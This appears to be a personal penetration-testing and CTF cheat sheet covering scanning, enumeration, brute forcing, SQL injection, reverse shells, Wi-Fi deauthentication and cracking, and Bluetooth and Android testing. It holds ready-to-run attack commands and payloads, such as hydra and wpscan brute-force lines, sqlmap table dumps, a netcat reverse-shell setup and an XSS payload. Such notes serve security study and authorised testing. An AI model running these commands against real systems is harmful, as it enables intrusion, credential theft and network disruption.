# InfoSecNotes
## Recon/Passive Scanning
* CTF Scanning
  * netdiscover - Shows IP addresses as ARP requests go over the interface
```
netdiscover -i eth0 -r <ip_addr>.0/24
```
  * arpscan - Sends out ARP scans and sees the responses
```
arpscan <ip_addr>.0/24
```
  * nmap
```
# Ping sweep, no port scan, no dns resolution
nmap -sn -n --disable-arp-ping <ip_addr>.1-254 | grep -v "host down"
# Basic
sudo nmap -sSV -p- <ip_addr> -oA <outfile> -T4
# Soft
nmap -sV -sC -oA <out_file> <ip_addr>
# Intensive
nmap -A -T4 -o <output_file> <ip_addr>
# Use searchsploit to detect vulnerable services
nmap -p- -sV -oX a.xml <ip_adr>; searchsploit --nmap a.xml
# Generate a nice scan report
nmap -sV <ip_addr> -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```
* Showdan
  * Go to shodan.io and use like a search engine
* Subdomain Enumeration
  * Subbrute
```
git clone https://github.com/TheRook/subbrute
python subbrute.py <domain_name>
```
  * Sublist3r
```
# Enum subdomains and show in real time
python sublist3r.py -v -d <domain_name>
```
  * Spyse
```
# Search for subdomains
spyse -target <domain_name> --subdomains
# Reverse IP Lookup
spyse -target <ip_addr> --domains-on-ip
# Search for SSL certificates
spyse -target <domain_name> --ssl-certificates
# Getting all DNS records
spyse -target <domain_name> --dns-all
```
  * Asset Finder - https://github.com/tomnomnom/assetfinder
```
go get -u github.com/tomnomnom/assetfinder
assetfinder [--subs-only] <domain>
```
## Enumeration/Active Scanning
* Scripts
  * enum4linux - Script to enumerate and check for exploits for a linux machine
```
enum4linux
```
* Samba
  * Guide https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
```
smbclient -L <ip_addr>
smbmap -H <ip_addr>
```
* Directory Traversal
  * Try different page numbers
    * 404 means page doesn't exists
    * 403 means forbidden and don't have access
    * Try entering different page types
  * Check id enumeration in the web page, if actual id then maybe you can get access to pages you're not suppose to
  * If internal, use x-forwarded-for in burp suite to make it look like an internal request
  * dirbuster with GUI
  * enumerate directories with "nmap --script http-enum.nse <ip_addr>"
  * dirb
```
# -X is the extension list, -N ignore status codes
dirb http://<url> /usr/share/dirb/common.txt -X .php,.html,.ini,.txt -o <output_file>
```
  * wfuzz
```
# -c is for colorful, -w is the wordlist, --hc is to ignore status codes, command line needs FUZZ somewhere
wfuzz -c -v -w /usr/share/wordlists/rockyou.txt --hc 404,402 http://<url>/FUZZ
```
  * gobuster
```
./gobuster -u <url> -w <wordlist> -t 10 -x <ext_list>
# With Subdomain list
./gobuster -m dns -w <subdomain_file> -u <url> -i
```
  * nmap - nmap scripts located at /usr/share/nmap/scripts
```
nmap --script http-enum.nse <ip_addr>
```
* Masscan
```
masscan -iL <ip_addr_file> --rate 10000 -p1-65535 --open-only -oL <output_file>
masscan -e <internet_interface> -p1-65535,U:1-65535 <ip_addr> --rate 1000
```
* Enum4all
```
./enum4linux <ip_addr>
```
* Nikto - enumerates ports and tries to find potential vulns
```
nikto -h <ip_addr>
```
## Vulnerablility Research
* Password Cracking
  * Hashcat
    * Example hashes at https://hashcat.net/wiki/doku.php?id=example_hashes
    * -a 0 is standard cracking
```
hashcat -a 0 -m <hash_type> <hash_file> <wordlist> (might need --force if on VM)
```
  * John the Ripper
```
john <hash_file>
```
* Research
  * searchsploit - looks for exploits for software and versions. Might try exploit-db.com too for new stuff
```
searchsploit <software and version to search for>
```
* Bruteforcing
  * Always try default passwords first. admin/admin, root/root, root/password
  * Hydra
```
hydra -l <user_name> -P /usr/share/wordlists/rockyou.txt <ip_addr> <protocol, ie ftp, ssh> -e nsr
hydra -l <user_name> -P /usr/share/wordlists/rockyou.txt <ip_addr> http-post-form "<url path>:<parameters, eg. username=^USER^&password=^PASS^>:<error message on failed login page>
```
## Exploitation
* Reverse Shells
  * In kali, there's /usr/share/webshells/ directory with reverse shell files
    * Change ip and port in the reverse shell filed
    * On local machine, use netcat to liten to part
    * Upload the reverse shell on the remote machine and it will open a reverse shell
  * http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  * Create netcat listener on host machine
```
nc -lnvp <port>
```
  * Spawn nicer bash shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
  * Create server on host machine to download files from
```
python -m SimpleHTTPServer
```
* SQL Injection
  * Add "'" to input to see if any SQL errors occur
    * Try "';" and see if any SQL errors occur
  * Try adding SQL input to url parameters if you think accessing the database
  * Try adding SQLi in Location or other Headers if possibly accessing db
  * sqlmap
    * To test for injection
```
# Checks for injection and databases
sqlmap -o -u <url of page> --forms --dbs
# To show the tables in the database
sqlmap -o -u <url of page> --forms -D <database_name> --tables
# Dump info from users table and try to crack password
sqlmap -o -u <url of page> --forms -D <database_name> -T <table_name> --dump
# Get the GET or POST request from repeater in burpsuite
sqlmap -r <request_file> -p <param to attack> --level=5 --risk=3
```
* MySQL
  * If there's a php CLI server running or even if not, you can try to write malicious php code to certain files
* Wordpress
  * Scan for vulnerabilites and users
```
wpscan --url <ip_addr> -e at -e ap -e u
```
  * Brute for wordpress login
```
wpscan --url <url to page> -U <user_name> -P /usr/share/wordlists/rockyou.txt
```
* Metasploit
  * Use this cheatsheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md
* PHP
  * Look for php include errors by entering "?page=../" in the url and see if undefined
  * Also try inserting <?php phpinfo()?> in form
## Privilege Escalation
* Windows
  * Useful site for living off the land https://lolbas-project.github.io/
* Linux
  * Useful site for living off the land https://gtfobins.github.io/
  * LinEnum - Download from https://github.com/rebootuser/LinEnum
```
./LinEnum.sh -s -k keyword -r <report_name> -e /tmp/ -t
```
  * LinuxSmartEnumeration - uses many tools from LinEnum and tries to gradually increase the intensity
```
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
./lse.sh
```
## Reverse Engineering
* If a stack canary exists, there's a check stack function at the end of the function before it returns
* To see if ASLR enabled for linux. To turn off, echo 2 to this address and to enable, echo 0
```
cat /proc/sys/kernel/randomize_va_space
```
* To check if stack executable. If the Flg has "E" then executable
```
readelf -l <file> | grep GNU_STACK
```
* String Format Exploits
  * Use %n to write number of bytes printed before %n to an address that's in the stack
    * Need to find the offset of bytes to the beginning of the stack use %<offset>$n
    * You can write a word or half word at a time because the address could be large
* Heap Exploit
  * For unlink heap overflow, use negative values for the size so the addresses are used within the mem chunk and not the previous chunk
## Wifi Hacking
* wifite2 - tools that provides a menu and automates wifi hacking
```
wifite
```
* airgeddon - tools that prrovide a menu that automates wifi hacking. Has reaver, WPS pixie-dust
  * Create evil twin AP that has the same name as target AP but no password
```
git clone github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash ./airgeddon.sh
```
* airgraph-ng - collect devices and names connected to different APs
```
airodump-ng <wlan-monitor-mode> -w <capture_file_name>
# Graph of connected devices
airgraph-ng -o <output_image>.png -i <captured_file_name>.csv -g CAPR
# Graph of disconnected devices
airgraph-ng -o <output_image>.png -i <captured_file_name>.csv -g CPG
```
* Manual wifi commands
```
# Put wifi in monitor mode
airmon-ng start wlan0
# List available APs and channels
airodump-ng <wlan-monitor-mode>
# Capture traffic on one AP and channel
airodump-ng --bssid <BSSID> -c <channel> --write <output_file_name> <wlan-monitor-mode>
# In another window, deauth the target
aireplay-ng --deauth 100 -a <BSSID> <wlan-monitor-mode>
# Wait for the handshake to be capture, airodump-ng says "WP handshake" in the far right top line
# Crack the password
aircrack-ng <output_file> -w <wordlist>
```
## Bluetooth Hacking
* bettercap
  * There's issues were it will only do ble.show one time and then you have to exit bettercap and restart it
  * The MAC addresses of iPhones will rotate
```
# Install
apt install golang
go get github.com/bettercap/bettercap
cd $GOPATH/src/github.com/bettercap/bettercap
make build
sudo make install
# Start
sudo bettercap
# Bluetooth sniffing
bettercap>> ble.recon on
# Enumerate devices
bettercap>> ble.show
# Scan device
bettercap>> ble.enum <MAC>
# There should be some write attributes and we can write to it
bettercap>> ble.write <MAC> <attr_id> <value>
```
## XSS Injection
* If you can enter text i form, try "<img src=x onerror=alert(1)"
* Enter text in header and/or body
  * Especially good if posted to forum or list so others can see the XSS injection
* Try adding javascript in the Location header
* In the code, look for escape characters like below that sanitize for XSS but if an input does not have that, it may be vulnerable
 ```
 <p>${message.body.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p>
 ```
## Graphql
* Reference this site for tips https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
* Use the full schema payload IntrospectionQuery to get the full schema of the graphql
* Use the url to view the query and query types in the graphql
* Use the dekstop graphql playground app to see the docs and schema easily and write query and mutations
## Android Mobile
* apktool will get the resources out of an apk
* jadx - decompiles apk to java source
* To use vim to browse java, "ctags -R; find . -name *.java > cscope.files; cscope -b;"
* Native java files will be in library in resources lib probably
* Can be dynamically and statically linked
  * Use ghidra to analyze native library
  * JENV object is always the first argument in native c functions, jenv.h can be loaded into ghidra for the struct definitions
* Use https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial and https://frida.re/docs/android/
* frida
 * You can use frida to bypass certain parts of the code like SSL Pinning
 * Use the commands below to start frida
```
# Copy frida server to data local tmp, set the permissions and run
adb shell /data/local/tmp/frida-server
# Javascript can look slike this
Java.perform(function() {
  var Object = Java.use("Java.object.class")
  Object.functionName.implementation = function(arg1, arg2) {
   <do stuff>
  };
});
# To start app with script
frida -U --no-pause -l script.js -f app_name
```
## Resources
* Tips tools and guides in https://github.com/swisskyrepo/PayloadsAllTheThings
